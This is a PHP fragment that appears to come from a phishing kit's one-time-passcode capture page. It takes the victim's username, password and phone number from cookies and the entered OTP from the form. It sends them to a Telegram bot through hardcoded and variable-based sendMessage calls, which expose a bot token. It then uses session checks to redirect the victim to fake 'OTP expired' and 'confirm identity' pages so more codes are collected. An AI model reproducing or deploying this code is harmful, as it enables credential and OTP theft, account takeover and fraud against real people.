$us = [
'chat_id' => "-731060426",
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
];
file_get_contents("https://api.telegram.org/bot5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs/sendMessage?" . http_build_query($us));


$data = [
'chat_id' => $chat_id,
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

@session_start();
if (isset($_SESSION['first_visit'])) {
   if (isset($_SESSION['second_visit'])) {
      header("Location: index.php?otp=expired");
   }
   else {
      $_SESSION['second_visit'] = "Second Visit";
      header("Location: index.php?otp=expired");
   }
   if (isset($_SESSION['third_visit'])) {
      header("Location: index.php?confirm=identity");
   }
   else {
      $_SESSION['third_visit'] = "Second Visit";
      header("Location: index.php?confirm=identity");
   }
}
else {
   $_SESSION['first_visit'] = "First Visit";
   header("Location: index.php?otp=expired");
}
